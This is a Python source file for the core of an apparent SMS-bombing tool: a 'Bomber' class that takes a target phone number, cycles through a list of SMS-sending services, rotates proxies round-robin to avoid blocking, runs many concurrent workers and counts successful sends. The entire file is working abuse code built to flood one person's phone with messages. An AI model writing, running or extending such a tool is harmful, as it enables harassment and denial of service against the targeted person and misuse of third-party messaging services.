from typing import List, Optional, Dict, Any
import asyncio
from .base_service import BaseService
from .proxy_manager import ProxyManager


class Bomber:
    def __init__(
        self,
        phone: str,
        services: List[BaseService],
        proxy_manager: Optional[ProxyManager] = None,
        threads: int = 10
    ):
        self.phone = phone
        self.services = services
        self.proxy_manager = proxy_manager
        self.threads = threads
        self.results: List[Dict[str, Any]] = []
    
    async def _run_service(self, service_class: type, proxy: Optional[str] = None):
        service = service_class(self.phone, proxy)
        try:
            async with service:
                result = await service.send_sms()
                self.results.append({
                    'service': service.name,
                    'success': result.get('success', False),
                    'message': result.get('message', ''),
                    'proxy': proxy
                })
        except Exception as e:
            self.results.append({
                'service': service_class.__name__,
                'success': False,
                'message': str(e),
                'proxy': proxy
            })
    
    async def _worker(self, queue: asyncio.Queue):
        while True:
            task = await queue.get()
            if task is None:
                break
            
            service_class, proxy = task
            await self._run_service(service_class, proxy)
            queue.task_done()
    
    async def start(self, cycles: int = 1):
        queue = asyncio.Queue()
        
        tasks = []
        for _ in range(cycles):
            for service_class in self.services:
                if self.proxy_manager and self.proxy_manager.has_proxies():
                    proxy = self.proxy_manager.get_round_robin()
                else:
                    proxy = None
                await queue.put((service_class, proxy))
        
        workers = [
            asyncio.create_task(self._worker(queue))
            for _ in range(self.threads)
        ]
        
        await queue.join()
        
        for _ in range(self.threads):
            await queue.put(None)
        
        await asyncio.gather(*workers)
    
    def get_stats(self) -> Dict[str, Any]:
        total = len(self.results)
        successful = sum(1 for r in self.results if r['success'])
        failed = total - successful
        
        services_stats = {}
        for result in self.results:
            service_name = result['service']
            if service_name not in services_stats:
                services_stats[service_name] = {'success': 0, 'failed': 0}
            if result['success']:
                services_stats[service_name]['success'] += 1
            else:
                services_stats[service_name]['failed'] += 1
        
        return {
            'total': total,
            'successful': successful,
            'failed': failed,
            'services': services_stats
        }

